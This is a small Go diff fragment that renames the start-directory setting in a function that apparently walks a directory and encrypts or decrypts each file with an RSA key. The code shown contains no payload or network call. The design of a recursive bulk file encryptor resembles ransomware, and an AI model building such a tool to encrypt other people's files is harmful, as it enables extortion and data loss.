@@ -8,7 +8,7 @@ import (
 )
 
 func goWalkCryption(priv *rsa.PrivateKey, wg *sync.WaitGroup) {
-	startDir := c.TargetDir
+	startDir := cfg.Location
 	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
 		if isEncrypted {
 			debug(filepath, " decrypting...")
